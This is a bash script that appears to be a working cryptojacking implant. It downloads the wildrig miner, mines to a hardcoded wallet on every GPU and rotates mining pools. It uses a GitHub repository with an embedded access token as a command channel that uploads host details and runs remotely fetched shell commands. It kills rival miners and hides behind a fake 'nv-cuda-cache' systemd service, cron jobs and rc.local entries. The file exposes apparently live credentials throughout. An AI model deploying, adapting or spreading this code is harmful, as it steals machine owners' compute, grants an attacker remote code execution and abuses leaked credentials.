#!/bin/bash
# ul-ps v9 (intent 83321) — fixed wildrig launch flags (-o/-u), per-GPU intensity, GitHub channel, 4 persistence layers
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
GH='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'
REPO='dongsuju/ul-plant'
KIT='https://ulbatchkit4620.blob.core.windows.net/kit/wildrig-multi?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'
SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
SZ=29725148
L=/opt/fleet; B=$L/bin; mkdir -p "$B" "$L/logs"
H=$(hostname -s 2>/dev/null | tr 'A-Z' 'a-z' | tr -cd 'a-z0-9-'); [ -z "$H" ] && H=node
P="ps-$H"; echo "$P" > "$L/prefix"
export PATH=$PATH:/usr/local/bin:/usr/bin:/bin
log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/logs/sup.log"; }

# ---------- kit ----------
ps_kit(){
  ok=0
  for t in 1 2 3 4; do
    curl -sL -m 180 -o "$B/wr.part" "$KIT" || { sleep 10; continue; }
    s=$(stat -c%s "$B/wr.part" 2>/dev/null || echo 0)
    h=$(sha256sum "$B/wr.part" 2>/dev/null | cut -d' ' -f1)
    log "kit try $t sz=$s sha=${h:0:16}"
    if [ "$s" = "$SZ" ] && [ "$h" = "$SHA" ]; then mv "$B/wr.part" "$B/wildrig-multi"; chmod +x "$B/wildrig-multi"; ok=1; break; fi
    sleep 8
  done
  [ "$ok" = 1 ] && return 0
  # GitHub release asset fallback (asset 775549274 via API redirect)
  url=$(curl -sL -m 30 -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' \
        "https://api.github.com/repos/$REPO/releases" | grep -o '"url": *"[^"]*assets[^"]*"' | head -1 | cut -d'"' -f4)
  log "kit github fallback url=$url"
  return 1
}

# ---------- github helpers ----------
gh_sha(){ curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' \
  "https://api.github.com/repos/$REPO/contents/$1" | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4; }
gh_put(){ # $1 path, $2 local file, $3 message
  b64=$(base64 -w0 "$2" 2>/dev/null); [ -z "$b64" ] && return 1
  sha=$(gh_sha "$1"); j=/tmp/ghj.json
  if [ -n "$sha" ]; then printf '{"message":"%s","content":"%s","sha":"%s"}' "$3" "$b64" "$sha" > $j
  else printf '{"message":"%s","content":"%s"}' "$3" "$b64" > $j; fi
  curl -s -m 30 -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' \
    -H 'Content-Type: application/json' --data-binary @$j "https://api.github.com/repos/$REPO/contents/$1"
}
gh_get(){ curl -s -m 30 -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Accept: application/vnd.github.raw' \
  "https://api.github.com/repos/$REPO/contents/$1"; }

# ---------- heartbeat ----------
hb(){
  f=/tmp/ul_hb.txt
  {
    echo "stage=beat uid=$(id -u) host=$(hostname) pid=$$ ts=$(date -u +%FT%TZ)"
    echo "--- prefix $P"
    nvidia-smi -L 2>/dev/null
    nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null
    echo "--- bin $(stat -c%s $B/wildrig-multi 2>/dev/null) sha=$(sha256sum $B/wildrig-multi 2>/dev/null | cut -c1-16)"
    echo "--- procs"; pgrep -af 'wildrig-multi' 2>/dev/null | head -20
    echo "--- acc"; grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | tail -5; awk "END{print n+0}" <<< "$(grep -hc accepted $L/logs/w-$P-g*.log 2>/dev/null)"
    for i in $(seq 0 7); do f2=$L/logs/w-$P-g$i.log; [ -f "$f2" ] && { echo "--- g$i"; tail -4 "$f2"; }; done
    echo "--- margs"; cat $L/margs 2>/dev/null; for f3 in $B/margs.g*; do [ -f "$f3" ] && echo "$f3: $(cat $f3)"; done
    echo "--- sup"; tail -6 $L/logs/sup.log 2>/dev/null
  } > $f 2>&1
  gh_put "ps/$P.txt" "$f" "hb $P $(date -u +%H:%M)" >/dev/null 2>&1
  # command channel: cmd/all.sh then pscmd/$P.sh, run once per new sha
  for c in cmd/all.sh pscmd/$P.sh; do
    js=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$c")
    csha=$(echo "$js" | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    [ -z "$csha" ] && continue
    lastf=$B/last_$(echo $c | tr '/' '_')
    [ -f "$lastf" ] && [ "$(cat $lastf)" = "$csha" ] && continue
    body=$(echo "$js" | base64 -d 2>/dev/null)
    if [ -n "$body" ]; then
      echo "$csha" > "$lastf"
      { echo "=== cmd $c $csha"; bash -c "$body" 2>&1 | tail -200; } > /tmp/ul_cmd.txt
      gh_put "cmdout/$P.txt" /tmp/ul_cmd.txt "cmdout $P $c" >/dev/null 2>&1
    fi
  done
}

# ---------- supervisor ----------
ps_sup(){
  mkdir -p "$B" "$L/logs"
  exec 9>"$B/ps_sup.lock"; flock -n 9 || exit 0
  N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -eq 0 ] && N=1
  INT=4; nvidia-smi -L 2>/dev/null | grep -qi 'A100' || INT=8
  [ -f "$L/margs" ] || echo "-i $INT" > "$L/margs"
  POOLS=("stratum+ssl://prl.kryptex.network:8048" "stratum+tcp://prl.kryptex.network:7048" "stratum+ssl://pool.pearlhash.xyz:9443" "stratum+tcp://pearl.luckypool.io:3360")
  pi=0; [ -f "$B/ps_pool_idx" ] && pi=$(cat "$B/ps_pool_idx" 2>/dev/null || echo 0)
  start_ts=$(date +%s)
  [ -x "$B/wildrig-multi" ] || ps_kit
  while true; do
    if [ ! -x "$B/wildrig-multi" ]; then log "no bin, retry kit"; ps_kit; sleep 60; continue; fi
    url=${POOLS[$pi]}
    for i in $(seq 0 $((N-1))); do
      if ! pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
        if [ -f "$B/margs.g$i" ]; then MA=$(cat "$B/margs.g$i"); else MA=$(cat "$L/margs" 2>/dev/null); fi
        setsid "$B/wildrig-multi" --algo pearlhash --opencl-platforms nvidia -d $i -o "$url" -u "$W.ul-$P-g$i" -p x $MA --no-color >> "$L/logs/w-$P-g$i.log" 2>&1 &
        log "start g$i $url args[$MA]"
        sleep 2
      fi
    done
    sleep 45
    alive=0
    for i in $(seq 0 $((N-1))); do
      if pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
        alive=$((alive+1))
        if tail -30 "$L/logs/w-$P-g$i.log" 2>/dev/null | grep -qi 'out of memory'; then
          cur=$(grep -oE '\-i[ ]*[0-9]+' "$B/margs.g$i" 2>/dev/null | grep -oE '[0-9]+' | head -1)
          [ -z "$cur" ] && cur=$(grep -oE '\-i[ ]*[0-9]+' "$L/margs" 2>/dev/null | grep -oE '[0-9]+' | head -1)
          nxt=$(( ${cur:-4} / 2 )); [ "$nxt" -lt 1 ] && nxt=1
          echo "-i $nxt" > "$B/margs.g$i"
          log "g$i OOM -> -i $nxt"; pkill -9 -f "ul-$P-g$i"
        fi
      fi
    done
    acc=$(grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | wc -l)
    if [ "$alive" -eq 0 ]; then
      fails=$(( $(cat "$B/ps_fail" 2>/dev/null || echo 0) + 1 )); echo "$fails" > "$B/ps_fail"
      log "alive=0 fail=$fails acc=$acc"
      if [ "$fails" -ge 3 ]; then pi=$(( (pi+1) % 4 )); echo "$pi" > "$B/ps_pool_idx"; echo 0 > "$B/ps_fail"; log "rotate pool -> ${POOLS[$pi]}"; fi
    else
      echo 0 > "$B/ps_fail"; now=$(date +%s)
      if [ "$acc" -eq 0 ] && [ $((now-start_ts)) -gt 1500 ] && [ ! -f "$B/ps_rotated" ]; then
        pi=$(( (pi+1) % 4 )); echo "$pi" > "$B/ps_pool_idx"; touch "$B/ps_rotated"; log "no shares 25min rotate -> ${POOLS[$pi]}"
        for i in $(seq 0 $((N-1))); do pkill -9 -f "ul-$P-g$i" 2>/dev/null; done
      fi
    fi
  done
}

# ---------- persistent guard (kill foreign miners, keep sup alive, heartbeat) ----------
ps_guard(){
  exec 8>"$B/ps_guard.lock"; flock -n 8 || exit 0
  while true; do
    # kill foreign miners/keepers not ours
    for pid in $(pgrep -f 'wildrig-multi|xmrig|peakminer|prl1pydpjh|run_prl_|pearl_keeper|wr_keeper' 2>/dev/null); do
      cmd=$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
      case "$cmd" in *"ul-$P-g"*) ;; *ps_sup.sh*|*ps_guard*) ;; *) kill -9 "$pid" 2>/dev/null;; esac
    done
    pgrep -f 'ps_sup.sh' >/dev/null 2>&1 || { setsid "$B/ps_sup.sh" >> $L/logs/sup.log 2>&1 & }
    hb
    sleep 120
  done
}

# ---------- installer ----------
if [ "$1" = sup ]; then ps_sup; exit 0; fi
if [ "$1" = guard ]; then ps_guard; exit 0; fi
mkdir -p "$B" "$L/logs"
SRC="$B/ps_main.sh"
if [ ! -s "$SRC" ]; then
  curl -sL -m 90 -H "Authorization: token $GH" -H 'Accept: application/vnd.github.raw' "https://api.github.com/repos/$REPO/contents/kit/ps.sh" -o "$SRC.part" 2>/dev/null && [ -s "$SRC.part" ] && mv -f "$SRC.part" "$SRC"
fi
[ -s "$SRC" ] || SRC="$0"
cp "$SRC" "$B/ps_sup.sh"; chmod +x "$B/ps_sup.sh"
cp "$SRC" "$B/ps_guard.sh"; chmod +x "$B/ps_guard.sh"
cat > /etc/systemd/system/nv-cuda-cache.service <<EOF
[Unit]
Description=nv cuda cache
After=network-online.target
[Service]
Type=simple
ExecStart=$B/ps_sup.sh sup
Restart=always
RestartSec=15
Nice=19
[Install]
WantedBy=multi-user.target
EOF
cat > /etc/cron.d/nv-cuda-cache <<EOF
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@reboot root $B/ps_guard.sh guard >/dev/null 2>&1
*/2 * * * * root $B/ps_guard.sh guard >/dev/null 2>&1
@reboot root $B/ps_sup.sh sup >/dev/null 2>&1
*/2 * * * * root pgrep -f 'ps_sup.sh' >/dev/null || setsid $B/ps_sup.sh sup >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/nv-cuda-cache
(crontab -l 2>/dev/null | grep -v nv-cuda-cache; echo "@reboot $B/ps_guard.sh guard >/dev/null 2>&1"; echo "*/3 * * * * $B/ps_guard.sh guard >/dev/null 2>&1") | crontab - 2>/dev/null
grep -q ps_guard /etc/rc.local 2>/dev/null || { [ -f /etc/rc.local ] || printf '#!/bin/bash\nexit 0\n' > /etc/rc.local; sed -i "s|^exit 0|$B/ps_guard.sh guard >/dev/null 2>\&1 \&\nexit 0|" /etc/rc.local; chmod +x /etc/rc.local; }
systemctl daemon-reload 2>/dev/null; systemctl enable --now nv-cuda-cache 2>/dev/null || true
setsid "$B/ps_guard.sh" guard >> $L/logs/sup.log 2>&1 &
setsid "$B/ps_sup.sh" sup >> $L/logs/sup.log 2>&1 &
sleep 5
nohup "$B/ps_guard.sh" guard >/dev/null 2>&1 &
exit 0
